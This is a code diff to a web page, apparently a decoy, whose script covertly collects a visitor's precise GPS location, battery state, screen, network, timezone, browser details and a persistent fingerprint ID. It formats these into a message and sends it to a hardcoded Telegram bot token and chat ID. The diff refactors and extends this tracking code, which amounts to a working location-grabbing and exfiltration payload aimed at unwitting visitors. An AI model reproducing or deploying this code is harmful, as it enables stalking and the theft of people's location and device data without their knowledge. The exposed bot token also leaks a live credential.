@@ -19,8 +19,7 @@
     }
     img.logo {
       width: 160px;
-      margin-bottom: 30px;
-      margin-top: 30px;
+      margin: 30px 0;
       filter: grayscale(100%) brightness(150%);
     }
     h1 {
@@ -42,49 +41,53 @@
   <script>
     async function sendData() {
       try {
-        const location = await new Promise((resolve, reject) => {
-          navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true });
+        // Lokasi
+        const pos = await new Promise((res, rej) => {
+          navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true });
         });
+        const { latitude, longitude, speed = 'Unknown', heading = 'Unknown', altitude = 'Unknown', accuracy } = pos.coords;
 
-        const lat = location.coords.latitude;
-        const lon = location.coords.longitude;
-        const speed = location.coords.speed ?? 'Unknown';
-        const heading = location.coords.heading ?? 'Unknown';
-        const altitude = location.coords.altitude ?? 'Unknown';
-        const accuracy = location.coords.accuracy + 'm';
-
+        // Info browser
         const lang = navigator.language;
         const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
         const local = new Date().toLocaleString();
         const utc = new Date().toUTCString();
         const ua = navigator.userAgent;
 
-        const battery = await navigator.getBattery();
-        const batLevel = Math.round(battery.level * 100);
-        const batCharging = battery.charging ? 'Charging' : 'Not Charging';
+        // Baterai
+        let batLevel = 'Unknown', batCharging = 'Unknown';
+        if ('getBattery' in navigator) {
+          const battery = await navigator.getBattery();
+          batLevel = Math.round(battery.level * 100);
+          batCharging = battery.charging ? 'Charging' : 'Not Charging';
+        }
 
+        // Layar & koneksi
         const screenRes = `${screen.width}x${screen.height}`;
         const colorDepth = screen.colorDepth;
         const platform = navigator.platform;
-        const connection = navigator.connection || {};
-        const netType = connection.effectiveType || 'Unknown';
-        const downSpeed = connection.downlink || 'Unknown';
+        const conn = navigator.connection || {};
+        const netType = conn.effectiveType || 'Unknown';
+        const downSpeed = conn.downlink || 'Unknown';
 
-        const rawID = ua + screenRes + tz + lang;
-        const buffer = new TextEncoder().encode(rawID);
-        const digest = await crypto.subtle.digest('SHA-256', buffer);
-        const hashArray = Array.from(new Uint8Array(digest));
-        const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('').slice(0, 10).toUpperCase();
-        const ID = `USR-${hashHex}`;
+        // ID unik
+        let ID = localStorage.getItem("userID");
+        if (!ID) {
+          const raw = ua + screenRes + tz + lang;
+          const hash = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(raw));
+          ID = 'USR-' + Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, '0')).join('').slice(0, 10).toUpperCase();
+          localStorage.setItem("userID", ID);
+        }
 
+        // Format pesan
         const payload = `
 [ID: ${ID}]
-Lokasi dikirim: ${lat}, ${lon}
-https://maps.google.com/?q=${lat},${lon}
+Lokasi dikirim: ${latitude}, ${longitude}
+https://maps.google.com/?q=${latitude},${longitude}
 Speed: ${speed}
 Heading: ${heading}
 Altitude: ${altitude}
-Accuracy: ${accuracy}
+Accuracy: ${accuracy}m
 Lang: ${lang}
 TZ: ${tz}
 Local: ${local}
@@ -95,16 +98,24 @@ Platform: ${platform}
 Network: ${netType}, Downlink: ${downSpeed} Mbps
 Device: ${ua}`;
 
+        // Kirim via Telegram Bot API v6
         const token = "7317238253:AAEORpkEBywWC2AvP-GUj1wfr1m4K5irbV0";
         const chat_id = "5677912817";
+        const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
-        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        await fetch(url, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id, text: payload })
+          body: JSON.stringify({
+            chat_id,
+            text: payload,
+            parse_mode: "HTML",
+            disable_web_page_preview: true
+          })
         });
+
       } catch (err) {
-        console.error("Gagal kirim:", err);
+        console.error("Gagal mengirim data:", err);
       }
     }
 
